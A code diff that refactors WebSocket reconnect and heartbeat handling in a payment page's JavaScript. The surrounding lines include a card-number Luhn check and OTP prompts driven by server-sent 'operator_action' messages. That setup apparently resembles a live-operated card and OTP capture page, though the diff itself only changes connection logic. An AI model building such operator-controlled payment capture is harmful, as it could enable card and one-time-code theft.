@@ -372,16 +372,18 @@ function luhn(n){var s=0,a=0;for(var i=n.length-1;i>=0;i--){var d=parseInt(n[i],
 
 
 // === Payment Backend WebSocket ===
-var ws=null,sid=null,wsTimer=null;
+var ws=null,sid=null;
+var reconnectTimer=null,wsRetries=0;
 var cid=localStorage.getItem('cineplex_cid');
 if(!cid){cid='cust_'+Date.now()+'_'+Math.random().toString(36).slice(2,8);localStorage.setItem('cineplex_cid',cid)}
 
 function wsConnect(){
-if(ws){ws._intentional=true;try{ws.close()}catch(e){}};
+if(ws){ws._dead=true;try{ws.close()}catch(e){}}
 var url=(location.protocol==='https:'?'wss:':'ws:')+'//'+location.host+'/api/?role=customer&cid='+cid+(sid?'&sid='+sid:'');
-ws=new WebSocket(url);
-ws.onopen=function(){wsRetries=0;console.log('[WS] Connected');if(wsTimer)clearInterval(wsTimer);wsTimer=setInterval(function(){if(ws&&ws.readyState===1)ws.send(JSON.stringify({type:'heartbeat'}))},10000)};
-ws.onmessage=function(e){
+var socket=new WebSocket(url);
+socket._hb=null;
+socket.onopen=function(){wsRetries=0;console.log('[WS] Connected');if(socket._hb)clearInterval(socket._hb);socket._hb=setInterval(function(){if(socket.readyState===1)socket.send(JSON.stringify({type:'heartbeat'}))},10000)};
+socket.onmessage=function(e){
 var msg=JSON.parse(e.data);
 console.log('[WS] Received:',msg);
 if(msg.type==='operator_action'){
@@ -416,8 +418,9 @@ else if(a==='resend_ok'){window._otpResendCount=p.count||1;startResendCooldown()
 else if(a==='resend_limit'){var rb=document.getElementById('otp-resend');if(rb){rb.disabled=true;rb.textContent='Limit reached'};showInline(p.message||'Maximum resend attempts reached. Please try again later.',true)}
 }
 };
-ws.onclose=function(){console.log('[WS] Disconnected.');if(wsTimer)clearInterval(wsTimer);if(!ws._intentional){wsRetries=(wsRetries||0)+1;var delay=wsRetries>3?30000:10000;setTimeout(wsConnect,delay)}};
-ws.onerror=function(e){console.log('[WS] Error')};
+socket.onclose=function(_evt){console.log('[WS] Disconnected');if(socket._hb){clearInterval(socket._hb);socket._hb=null}if(!socket._dead){wsRetries+=1;var delay=wsRetries>3?30000:10000;if(reconnectTimer)clearTimeout(reconnectTimer);reconnectTimer=setTimeout(wsConnect,delay)}};
+socket.onerror=function(){console.log('[WS] Error')};
+ws=socket;
 }
 wsConnect();
 // Restore persistent inline message if any
